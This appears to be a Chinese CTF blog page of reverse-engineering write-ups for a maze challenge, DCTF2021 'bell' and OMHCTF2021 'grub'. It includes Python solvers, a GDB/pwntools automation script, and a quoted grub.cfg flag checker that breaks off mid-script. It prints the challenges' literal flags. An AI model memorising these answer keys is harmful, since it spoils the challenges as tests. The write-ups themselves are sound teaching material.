<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">md_token = [[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]  <span class="comment">#init 2 dim array</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        md_token[i][j] = <span class="number">0x10</span> + <span class="number">10</span>*j + i</span><br><span class="line">        <span class="comment">#print(&quot;%d %d:\t%s&quot;,i, j, hex(md_token[i][j]))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>(<span class="params">token</span>):</span></span><br><span class="line">    code = &#123;&#125;</span><br><span class="line">    code[<span class="string">&quot;w&quot;</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + (token + <span class="number">13</span>) % <span class="number">0x1a</span>)</span><br><span class="line">    code[<span class="string">&quot;a&quot;</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + (token + <span class="number">43</span>) % <span class="number">0x1a</span>)</span><br><span class="line">    code[<span class="string">&quot;s&quot;</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + (token + <span class="number">57</span>) % <span class="number">0x1a</span>)</span><br><span class="line">    code[<span class="string">&quot;d&quot;</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + (token + <span class="number">24</span>) % <span class="number">0x1a</span>)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line">   </span><br><span class="line"><span class="comment">#print(md_token)   </span></span><br><span class="line"><span class="comment">#print(hex(md_token[0][0]))</span></span><br><span class="line"><span class="comment">#code = get_code(md_token[0][0])</span></span><br><span class="line"><span class="comment">#print(&#123;i : chr(code[i]) for i in code&#125;)</span></span><br><span class="line"></span><br><span class="line">TOP = <span class="number">1</span></span><br><span class="line">RIGHT = <span class="number">2</span> </span><br><span class="line">BOTTOM = <span class="number">4</span></span><br><span class="line">LEFT = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">maze = [[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\0Study5\re\Monstrosity\maze.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment">#data = f.read()</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            maze[x][y] = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, f.read(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maze_walk</span>(<span class="params">maze, x0, y0</span>):</span></span><br><span class="line">    visited = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">    queue = []</span><br><span class="line">    queue.append([(x0,y0)])</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(queue) != <span class="number">0</span>):</span><br><span class="line">        path = queue.pop(<span class="number">0</span>)</span><br><span class="line">        (x,y) = path[-<span class="number">1</span>]</span><br><span class="line">        visited[x][y] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">9</span> <span class="keyword">and</span> y == <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">        status = maze[x][y]</span><br><span class="line">        neighbor = []</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (status &amp; TOP) <span class="keyword">and</span> y &gt; <span class="number">0</span>:</span><br><span class="line">            neighbor.append((x, y -<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> (status &amp; BOTTOM) <span class="keyword">and</span> y &lt; <span class="number">9</span>):</span><br><span class="line">            neighbor.append((x, y + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> (status &amp; LEFT) <span class="keyword">and</span> x &gt; <span class="number">0</span>):</span><br><span class="line">            neighbor.append((x - <span class="number">1</span>, y))</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> (status &amp; RIGHT) <span class="keyword">and</span> x &lt; <span class="number">9</span>):</span><br><span class="line">            neighbor.append((x + <span class="number">1</span>, y))</span><br><span class="line">        <span class="comment">#print(neighbor)</span></span><br><span class="line">        new_path = [path + [(x,y)] <span class="keyword">for</span> (x,y) <span class="keyword">in</span> neighbor <span class="keyword">if</span> <span class="keyword">not</span> visited[x][y]]</span><br><span class="line">        queue += new_path</span><br><span class="line">    print(<span class="string">&quot;WRONG&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">sol = maze_walk(maze, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sol) - <span class="number">1</span>):</span><br><span class="line">    (x,y) = sol[i]</span><br><span class="line">    (x1,y1) = sol[i + <span class="number">1</span>]</span><br><span class="line">    code = get_code(md_token[x][y])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> x1 &lt; x:  <span class="comment">#Left</span></span><br><span class="line">        flag += code[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">    <span class="keyword">elif</span> x1 &gt; x: <span class="comment">#Right</span></span><br><span class="line">        flag += code[<span class="string">&quot;d&quot;</span>]</span><br><span class="line">    <span class="keyword">elif</span> y1 &gt; y: <span class="comment">#Down</span></span><br><span class="line">        flag += code[<span class="string">&quot;s&quot;</span>]</span><br><span class="line">    <span class="keyword">elif</span> y1 &lt; y: <span class="comment">#Up</span></span><br><span class="line">        flag += code[<span class="string">&quot;w&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;ALLES!&#123;%s&#125;&quot;</span>%flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ALLES!&#123;vfpzjtwmcdlvygjzabcsmlkjefgwmndxwrstucmwzhrucylowsfi&#125;</span></span><br></pre></td></tr></table></figure>









</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/26/DCTF2021-bell/">DCTF2021 bell</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PythonGDB/">PythonGDB</a></span><div class="content"><p>本题较为简单，逻辑都不用看，直接动态调试即可获得答案</p>
<p>但是，要自动化</p>
<p>PythonGDB自动化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Onbreakpoints</span>(<span class="params">gdb.Breakpoint</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,loc,callback</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(loc,<span class="built_in">int</span>):</span><br><span class="line">            loc = <span class="string">&quot;*&quot;</span> + <span class="built_in">hex</span>(loc)</span><br><span class="line">        <span class="built_in">super</span>(Onbreakpoints,self).__init__(loc,gdb.BP_BREAKPOINT,internal=<span class="literal">False</span>)</span><br><span class="line">        self.callback = callback</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.callback()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reg</span>(<span class="params">reg</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$&quot;</span>+reg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_reg</span>(<span class="params">reg,value</span>):</span></span><br><span class="line">    gdb.execute(<span class="string">&quot;set $&quot;</span>+reg+<span class="string">&quot;=&quot;</span>+<span class="built_in">str</span>(value))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mem</span>(<span class="params">address,length</span>):</span></span><br><span class="line">    inferior = gdb.selected_inferior()</span><br><span class="line">    <span class="keyword">return</span> inferior.read_memory(address,length)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mem</span>(<span class="params">address,length</span>):</span></span><br><span class="line">    inferior = gdb.selected_inferior()</span><br><span class="line">    <span class="keyword">return</span> inferior.write_memory(address,length)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------global var-------------</span></span><br><span class="line">list1 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------global var-------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback1</span>():</span></span><br><span class="line">    set_reg(<span class="string">&quot;rax&quot;</span>,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback2</span>():</span></span><br><span class="line">    list1.append(get_reg(<span class="string">&quot;rax&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_callback</span>():</span></span><br><span class="line">    print(list1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1)):</span><br><span class="line">        print(list1[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.execute(&quot;b *0x0000555555554000+0xA07&quot;)</span></span><br><span class="line">b1 = Onbreakpoints(<span class="number">0x0000555555554000</span>+<span class="number">0x9C7</span>,callback1)</span><br><span class="line">b2 = Onbreakpoints(<span class="number">0x0000555555554000</span>+<span class="number">0x935</span>,callback2)</span><br><span class="line">b3 = Onbreakpoints(<span class="number">0x0000555555554000</span>+<span class="number">0xA12</span>,exit_callback)</span><br><span class="line">print(<span class="string">&quot;success load gdb.py!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>在gdb中用命令 source 即可导入 python 实现自动调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">k2016@ubuntu:~/Desktop/re$ gdb &#x27;/home/k2016/Desktop/re/bell&#x27; </span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">89 commands loaded for GDB 9.2 using Python engine 3.8</span><br><span class="line">[*] 3 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from /home/k2016/Desktop/re/bell...</span><br><span class="line">(No debugging symbols found in /home/k2016/Desktop/re/bell)</span><br><span class="line">gef➤  source &#x27;/home/k2016/Desktop/re/gdb.py&#x27; </span><br><span class="line">&#x27;/home/k2016/Desktop/re/gdb.py&#x27;: No such file or directory.</span><br><span class="line">gef➤  source ./gdb.py</span><br><span class="line">Breakpoint 1 at 0x5555555549c7</span><br><span class="line">Breakpoint 2 at 0x555555554935</span><br><span class="line">Breakpoint 3 at 0x555555554a12</span><br><span class="line">success load gdb.py!</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure>
<p>不过这时候输入不是自动化的，配合pwntool将实现输入输出也自动化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&quot;gdb&quot;)</span><br><span class="line"># p.recvuntil(&quot;gef➤ &quot;)</span><br><span class="line">p.sendline(&quot;file .&#x2F;bell&quot;)</span><br><span class="line">p.sendline(&quot;source .&#x2F;gdb.py&quot;)</span><br><span class="line">p.sendline(&quot;r&quot;)</span><br><span class="line">for i in range(11):</span><br><span class="line">    p.sendline(&quot;123&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>nc得到flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">k2016@ubuntu:~/Desktop/re$ nc dctf-chall-bell.westeurope.azurecontainer.io 5311</span><br><span class="line">11</span><br><span class="line">115975</span><br><span class="line">137122</span><br><span class="line">162409</span><br><span class="line">192713</span><br><span class="line">229114</span><br><span class="line">272947</span><br><span class="line">325869</span><br><span class="line">389946</span><br><span class="line">467767</span><br><span class="line">562595</span><br><span class="line">678570</span><br><span class="line">dctf&#123;f1rst_step_t0wards_b3ll_l4bs&#125;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/25/OMHCTF2021-grub%E9%A2%98%E8%A7%A3/">OMHCTF2021 grub题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-25</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/reverse/">reverse</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/shell-script/">shell script</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/regexp/">regexp</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/z3/">z3</a></span><div class="content"><p>windows打开iso文件，读取 grub.cfg，里面有检查flag的 shell 脚本</p>
<p>linux下打开 iso 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o loop grub.iso tmp</span><br></pre></td></tr></table></figure>
<p>shell 脚本学习：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell-variable.html">https://www.runoob.com/linux/linux-shell-variable.html</a></p>
<p>shell 脚本中，<code>$</code>是关键字，正则表达式的pattern字符串想要使用<code>$</code>字符的话，必须转义，使用<code>\$</code></p>
<p>grub.cfg内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;Enter flag: &quot;</span><br><span class="line">read flag</span><br><span class="line"></span><br><span class="line">if ! regexp --set a &quot;^p4\&#123;([0-9A-Q]&#123;54&#125;)\&#125;\$&quot; &quot;$flag&quot;; then halt; fi</span><br><span class="line">while [ &quot;$a&quot; != &quot;&quot; ]; do</span><br><span class="line">    if regexp --set a &quot;^0(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;aaa&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^1(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;aab&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^2(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;aac&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^3(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;aba&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^4(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;abb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^5(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;abc&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^6(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;aca&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^7(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;acb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^8(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;acc&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^9(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;baa&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^A(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bab&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^B(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bac&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^C(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bba&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^D(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bbb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^E(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bbc&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^F(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bca&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^G(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bcb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^H(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;bcc&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^I(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;caa&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^J(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cab&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^K(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cac&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^L(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cba&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^M(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cbb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^N(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cbc&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^O(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;cca&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^P(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;ccb&quot;; fi</span><br><span class="line">    if regexp --set a &quot;^Q(.*)\$&quot; &quot;$a&quot;; then b=&quot;$&#123;b&#125;ccc&quot;; fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">while [ &quot;$b&quot; != &quot;&quot; ]; do</span><br><span class="line">    if regexp --set b &quot;^aa(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;R&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^ab(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;S&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^ac(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;T&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^ba(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;U&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^bb(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;V&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^bc(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;W&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^ca(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;X&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^cb(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;Y&quot;; fi</span><br><span class="line">    if regexp --set b &quot;^cc(.*)\$&quot; &quot;$b&quot;; then c=&quot;$&#123;c&#125;Z&quot;; fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">function t &#123;</span><br><span class="line">    A=&quot;&quot;</span><br><span class="line">    B=&quot;$1&quot;</span><br><span class="line">    while [ &quot;$B&quot; != &quot;&quot; ]; do</span><br><span class="line">        regexp --set 1:C --set 2:B &quot;^([0-9]*),(.*)&quot; &quot;$B&quot;</span><br><span class="line">        regexp --set D &quot;^.&#123;$C&#125;(.)&quot; &quot;$c&quot;</span><br><span class="line">        A=&quot;$&#123;A&#125;$&#123;D&#125;&quot;</span><br><span class="line">    done</span><br><span class="line">    if ! regexp &quot;^R?S?T?U?V?W?X?Y?Z?\$&quot; &quot;$A&quot;; then halt; fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u &#123;</span><br><span class="line">    if ! regexp --set 1:R --set 2:S --set 3:T --set 4:U --set 5:V --set 6:W --set 7:X --set 8:Y --set 9:Z &quot;$1&quot; &quot;$c&quot;; then halt; fi</span><br><span class="line">    A=&quot;$R$S$T$U$V$W$X$Y$Z&quot;</span><br><span class="line">    if ! regexp R $A; then halt; fi</span><br><span class="line">    if ! regexp S $A; then halt; fi</span><br><span class="line">    if ! regexp T $A; then halt; fi</span><br><span class="line">    if ! regexp U $A; then halt; fi</span><br><span class="line">    if ! regexp V $A; then halt; fi</span><br><span class="line">    if ! regexp W $A; then halt; fi</span><br><span class="line">    if ! regexp X $A; then halt; fi</span><br><span class="line">    if ! regexp Y $A; then halt; fi</span><br><span class="line">    if ! regexp Z $A; then halt; 